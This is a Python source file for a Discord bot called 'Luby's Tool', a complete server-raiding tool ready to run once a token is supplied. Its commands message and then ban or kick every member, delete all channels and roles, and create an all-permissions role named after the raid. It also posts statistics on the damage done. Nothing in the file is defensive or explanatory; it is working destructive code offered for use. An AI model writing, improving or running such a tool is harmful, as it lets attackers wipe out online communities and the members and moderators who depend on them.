import discord
from discord.ext import commands
from discord import Permissions
import asyncio


intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)
bot.remove_command("help")
bot._skip_check = lambda x, y: False

bans = []
deletes = []
droles = []
kicks = []




@bot.event
async def on_ready():
    print("Logged in as {}".format(bot.user))
    
#bans all members     
@bot.command()
async def members(ctx):
    reason = "The server gets currently raided with Luby's Tool"
    message = f"You have been banned from {ctx.guild.name}, {reason}"
    members = []
    x = ctx.guild.members
    for member in x:
        members.append(member)

    for member in members:
        try:
            await member.send(message)
        except:
            pass
        try:
            await ctx.guild.ban(member, reason=reason)
            bans.append(member.user)
            await ctx.channel.send(f"{member} is banned!")
        except:
            try:
                await ctx.guild.kick(member, reason=reason)
                kicks.append(member.user)
                await ctx.channel.send(f"{member} is kicked!")
            except:
                pass
#deletes all channels and creats one
@bot.command()
async def channels(ctx):
    text_channel_list = []
    for channel in ctx.guild.channels:
        text_channel_list.append(channel)
    await ctx.guild.create_text_channel('raided with lubys tool')
    for channel in text_channel_list:
        try:
            await channel.delete()
            deletes.append(channel.name)
        except:
            pass
#deletes all roles and creates a new one
@bot.command()
async def roles(ctx):
    roles = []
    for role in ctx.guild.roles:
        roles.append(role)
    await ctx.guild.create_role(name="raided with lubys tool", permissions=Permissions.all(), colour=discord.Colour(0xbe3809))

    for role in roles:
        try:
            await role.delete(reason=None)
            await ctx.send("Role deleted: {}".format(role))
            droles.append(role.name)
        except:
            pass
    
#stats
@bot.command()
async def stats(ctx):
    embed = discord.Embed(title="STATS", colour=discord.Colour(0xbe3809))
    embed.set_author(name="Luby's - Tools", icon_url=ctx.author.avatar_url)
    embed.set_footer(text="Made by Luby")

    embed.add_field(name="BANS", value=len(bans))
    embed.add_field(name="KICKS", value=len(kicks))
    embed.add_field(name="CHANNELS DELETED", value=len(deletes))
    embed.add_field(name="ROLES DELETED", value=len(droles))

    await ctx.send(embed=embed)
# nerdstats
@bot.command()
async def nerdstats(ctx):
    await ctx.send("Bans: {}\nKicks: {}\nChannelDeletes: {}\nRolesDeltes: {}".format(bans, kicks, deletes, droles))

@bot.command()
async def help(ctx):
    embed = discord.Embed(title="HELP", colour=discord.Colour(0xbe3809))
    embed.set_author(name="Luby's - Tools", icon_url=ctx.author.avatar_url)
    embed.set_footer(text="Made by Luby - Version 1.0")

    embed.add_field(name="help", value="Shows this message")
    embed.add_field(name="channels", value="deletes all channels and creats a new one")
    embed.add_field(name="roles", value="deletes all roles and creats a new one")
    embed.add_field(name="members", value="bans all members")
    embed.add_field(name="stats", value="shows some stats")
    embed.add_field(name="nerdstats", value="shows ugly stats, but with some more info")

    await ctx.send(embed=embed)



bot.run('') #your token here
